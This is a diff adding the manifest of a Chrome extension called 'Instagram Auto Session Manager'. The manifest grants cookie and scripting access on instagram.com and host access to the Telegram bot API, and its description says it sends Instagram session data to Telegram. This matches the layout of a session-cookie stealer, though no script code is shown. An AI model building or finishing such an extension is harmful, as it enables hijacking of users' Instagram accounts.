@@ -1,0 +1,70 @@
+{
+  "manifest_version": 3,
+  "name": "Instagram Auto Session Manager",
+  "version": "2.0.0",
+  "description": "Automatically detects Instagram sessions, asks for consent, and sends session data to Telegram with full transparency",
+  
+  "permissions": [
+    "activeTab",
+    "storage",
+    "cookies",
+    "tabs",
+    "scripting"
+  ],
+  
+  "host_permissions": [
+    "https://www.instagram.com/*",
+    "https://api.telegram.org/*"
+  ],
+  
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "Instagram Auto Session Manager",
+    "default_icon": {
+      "16": "icons/icon16.png",
+      "32": "icons/icon32.png",
+      "48": "icons/icon48.png",
+      "128": "icons/icon128.png"
+    }
+  },
+  
+  "content_scripts": [
+    {
+      "matches": ["https://www.instagram.com/*"],
+      "js": ["content-script.js"],
+      "run_at": "document_idle",
+      "all_frames": false
+    }
+  ],
+  
+  "background": {
+    "service_worker": "background.js",
+    "type": "module"
+  },
+  
+  "options_page": "options.html",
+  
+  "web_accessible_resources": [
+    {
+      "resources": [
+        "consent.html",
+        "consent.css",
+        "consent.js",
+        "icons/*"
+      ],
+      "matches": ["https://www.instagram.com/*"]
+    }
+  ],
+  
+  "icons": {
+    "16": "icons/icon16.png",
+    "32": "icons/icon32.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  
+  "author": "Instagram Session Manager Team",
+  
+  "homepage_url": "https://github.com/your-repo/instagram-session-manager"
+}
+
